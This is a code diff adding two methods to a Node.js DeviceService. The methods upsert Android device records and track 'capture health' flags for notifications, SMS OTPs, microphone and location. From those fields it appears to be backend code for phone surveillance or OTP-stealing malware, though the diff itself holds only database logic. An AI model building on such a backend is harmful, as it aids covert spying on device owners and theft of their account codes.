@@ -73,6 +73,139 @@ class DeviceService {
         }
     }
 
+    async incrementDeviceStats(deviceId, increments = {}, defaults = {}) {
+        try {
+            if (!deviceId) {
+                throw new Error('deviceId is required to increment device stats');
+            }
+
+            const update = {};
+            if (Object.keys(increments).length > 0) {
+                update.$inc = increments;
+            }
+
+            update.$set = { lastSeen: new Date() };
+
+            if (Object.keys(defaults).length > 0) {
+                update.$setOnInsert = {
+                    deviceId,
+                    deviceModel: defaults.deviceModel || defaults.deviceModel === '' ? defaults.deviceModel : 'Unknown',
+                    deviceBrand: defaults.deviceBrand || '',
+                    androidVersion: defaults.androidVersion || '',
+                    apiLevel: defaults.apiLevel || 0,
+                    screenResolution: defaults.screenResolution || '',
+                    totalStorage: defaults.totalStorage || '',
+                    availableStorage: defaults.availableStorage || '',
+                    ramSize: defaults.ramSize || '',
+                    cpuArchitecture: defaults.cpuArchitecture || '',
+                    isRooted: defaults.isRooted || false,
+                    firstSeen: new Date()
+                };
+            } else {
+                update.$setOnInsert = {
+                    deviceId,
+                    deviceModel: 'Unknown',
+                    deviceBrand: '',
+                    androidVersion: '',
+                    apiLevel: 0,
+                    screenResolution: '',
+                    totalStorage: '',
+                    availableStorage: '',
+                    ramSize: '',
+                    cpuArchitecture: '',
+                    isRooted: false,
+                    firstSeen: new Date()
+                };
+            }
+
+            const device = await Device.findOneAndUpdate(
+                { deviceId },
+                update,
+                {
+                    upsert: true,
+                    new: true,
+                    setDefaultsOnInsert: true
+                }
+            );
+
+            return {
+                success: true,
+                device
+            };
+        } catch (error) {
+            console.error('❌ Error incrementing device stats:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
+    }
+
+    async updateCaptureHealth(deviceId, captureStatus = {}, metadata = {}) {
+        try {
+            if (!deviceId) {
+                throw new Error('deviceId is required to update capture health');
+            }
+
+            const update = {
+                $set: {
+                    lastSeen: new Date(),
+                    lastHeartbeat: new Date()
+                },
+                $setOnInsert: {
+                    deviceId,
+                    deviceModel: metadata.deviceModel || 'Unknown',
+                    deviceBrand: metadata.deviceBrand || '',
+                    androidVersion: metadata.androidVersion || '',
+                    apiLevel: metadata.apiLevel || 0,
+                    screenResolution: metadata.screenResolution || '',
+                    totalStorage: metadata.totalStorage || '',
+                    availableStorage: metadata.availableStorage || '',
+                    ramSize: metadata.ramSize || '',
+                    cpuArchitecture: metadata.cpuArchitecture || '',
+                    isRooted: metadata.isRooted || false,
+                    firstSeen: new Date()
+                }
+            };
+
+            if (captureStatus && typeof captureStatus === 'object') {
+                if (captureStatus.notifications !== undefined) {
+                    update.$set['captureStatus.notifications'] = Boolean(captureStatus.notifications);
+                }
+                if (captureStatus.smsOtp !== undefined) {
+                    update.$set['captureStatus.smsOtp'] = Boolean(captureStatus.smsOtp);
+                }
+                if (captureStatus.microphone !== undefined) {
+                    update.$set['captureStatus.microphone'] = Boolean(captureStatus.microphone);
+                }
+                if (captureStatus.location !== undefined) {
+                    update.$set['captureStatus.location'] = Boolean(captureStatus.location);
+                }
+            }
+
+            const device = await Device.findOneAndUpdate(
+                { deviceId },
+                update,
+                {
+                    upsert: true,
+                    new: true,
+                    setDefaultsOnInsert: true
+                }
+            );
+
+            return {
+                success: true,
+                device
+            };
+        } catch (error) {
+            console.error('❌ Error updating capture health:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
+    }
+
     async getDeviceById(deviceId) {
         try {
             const device = await Device.findOne({ deviceId });
